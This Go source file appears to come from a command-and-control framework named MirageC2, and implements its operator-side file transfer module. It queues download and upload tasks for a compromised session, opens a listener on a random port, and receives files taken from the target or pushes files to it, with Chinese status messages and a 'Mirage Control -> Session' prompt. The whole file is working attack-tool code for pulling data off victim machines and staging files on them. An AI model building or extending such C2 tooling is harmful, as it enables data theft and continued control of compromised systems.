package exchange

import (
	"MirageC2_V1.0/public/common"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

func FileControl(action, localpath, remotepath string, intID int) {
	id := intID - 1
	job := &common.Jobs[id]
	fileport := strconv.Itoa(generateRandomPort())

	switch action {
	case "download":
		job.Tasks[99997] = remotepath + "[Mirage]" + fileport
		fileTransferServer("download", fileport, localpath, id)
	case "upload":
		job.Tasks[99996] = remotepath + "[Mirage]" + fileport
		fileTransferServer("upload", fileport, localpath, id)
	}
}

func generateRandomPort() int {
	rand.Seed(time.Now().UnixNano()) // Seed the random number generator
	return rand.Intn(10001) + 20000  // Generate a number in range 20000-30000
}

func fileTransferServer(action, port, localpath string, id int) {
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Printf("\n[-] 文件传输启动失败:", err)
		return
	}
	defer listener.Close()
	fmt.Printf("\r[+] 文件传输端口" + port + "侦听成功，等待数据传输\n")

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// 使用 goroutine 处理超时逻辑
	go func() {
		<-ctx.Done() // 等待超时
		//fmt.Printf("\n[!] 等待目标文件传输超时: 停止监听!\n")
		listener.Close() // 超时后关闭监听器
	}()

	// 接收连接
	for {
		conn, err := listener.Accept()
		if err != nil {
			break
		}
		if action == "download" {
			handleDownloadConnection(conn, localpath, id)
		} else if action == "upload" {
			handleUploadConnection(conn, localpath, id)
		}
	}
}

func handleDownloadConnection(conn net.Conn, localpath string, id int) {
	defer conn.Close()

	file, err := os.Create(localpath) // 存储接收到的文件
	if err != nil {
		fmt.Printf("[-] 无法创建文件:%v\n", err)
		fmt.Print("Mirage Control -> Session" + strconv.Itoa(id+1) + " > ")
		return
	}
	defer file.Close()

	// 读取并写入文件，同时计算进度
	buffer := make([]byte, 4096)
	var totalBytes int64
	for {
		n, err := conn.Read(buffer)
		if n > 0 {
			totalBytes += int64(n)
			file.Write(buffer[:n])
			fmt.Printf("\r[*] 接收数据中: %d bytes", totalBytes)
		}
		if err != nil {
			if err == io.EOF {
				// 判断是否接收到任何数据
				if totalBytes > 0 {
					fmt.Printf("\n[+] 文件接收完成!\n")
				} else {
					fmt.Printf("[-] 未接收到文件，传输失败!\n")
				}
				fmt.Print("Mirage Control -> Session" + strconv.Itoa(id+1) + " > ")
				return
			}
			fmt.Printf("\n[-] 文件接收错误:", err)
			fmt.Print("Mirage Control -> Session" + strconv.Itoa(id+1) + " > ")
			break
		}
	}
}

func handleUploadConnection(conn net.Conn, localpath string, id int) {
	defer conn.Close()

	file, err := os.Open(localpath) // 打开本地需要上传的文件
	if err != nil {
		fmt.Printf("[-] 无法打开文件: %v\n", err)
		fmt.Print("Mirage Control -> Session" + strconv.Itoa(id+1) + " > ")
		return
	}
	defer file.Close()

	buffer := make([]byte, 4096)
	var totalBytes int64
	for {
		n, err := file.Read(buffer)
		if n > 0 {
			totalBytes += int64(n)
			_, writeErr := conn.Write(buffer[:n])
			if writeErr != nil {
				fmt.Printf("\n[-] 文件上传中断: %v\n", writeErr)
				break
			}
			fmt.Printf("\r[*] 上传数据中: %d bytes", totalBytes)
		}
		if err != nil {
			if err == io.EOF {
				fmt.Printf("\n[+] 文件上传完成!\n")
				fmt.Print("Mirage Control -> Session" + strconv.Itoa(id+1) + " > ")
				break
			}
			fmt.Printf("\n[-] 文件读取错误: %v\n", err)
			fmt.Print("Mirage Control -> Session" + strconv.Itoa(id+1) + " > ")
			break
		}
	}
}
